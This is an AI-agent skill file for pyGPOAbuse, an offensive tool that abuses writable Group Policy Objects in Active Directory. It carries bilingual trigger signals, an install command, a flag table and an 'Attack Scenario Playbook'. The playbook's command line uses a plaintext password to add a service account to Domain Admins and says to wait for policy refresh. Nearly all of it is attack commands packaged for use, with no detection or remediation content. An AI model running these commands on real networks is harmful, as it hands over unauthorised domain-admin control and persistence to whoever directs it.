---
name: pygpoabuse-gpo-privesc
description: "pyGPOAbuse: Escalates writable GPOs to Domain Admin. Signals: AD attack, domain penetration, list GPO details, add user to group, abuse writable GPO for privilege escalation."
zh-signals: "pyGPOAbuse: 可写 GPO 提权到域管。信号:ad攻击,域渗透,列出 GPO 详情,把用户加进组,滥用可写 GPO 提权。"
when-to-use: "Use when a domain user can write to a Group Policy Object and you want to escalate privileges or persist by adding an account to a privileged group. Requires valid domain credentials and the GPO distinguished name."
---

# pyGPOAbuse

- Attack Category: C30 AD and Lateral Movement
- Upstream Repository: https://github.com/Hackndo/pyGPOAbuse
- Upstream License: MIT (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)

## Installation

```bash
git clone https://github.com/Hackndo/pyGPOAbuse && cd pyGPOAbuse && pip install -r requirements.txt
```

## Parameter Quick Reference

| Parameter / Command | Description |
| --- | --- |
| `python3 pygpoabuse DOMAIN/user -gpcname 'CN={GPO},CN=Policies,CN=System,DC=x'` | List GPO details |
| `-useraccount bob -addusertogroup 'CN=Admins,DC=x'` | Add the user to a group |
| `-vuln -useraccount bob -addusertogroup 'CN=Admins,DC=corp,DC=local'` | Abuse the writable GPO for privilege escalation |
| `-critical` | Flag critical groups |

## Attack Scenario Playbook

### Escalate a writable GPO to Domain Admin

```bash
python3 pygpoabuse CORP/svc -password 'Pass1' -gpcname 'CN={12345678-ABCD},CN=Policies,CN=System,DC=corp,DC=local' -vuln -useraccount svc -addusertogroup 'CN=Domain Admins,CN=Users,DC=corp,DC=local'
# Wait 5-15 minutes for Group Policy refresh, then svc is in Domain Admins
```

## Notes

Writes Group Policy directly into a GPO writable by the current user to achieve privilege escalation/persistence, no Domain Admin rights needed.
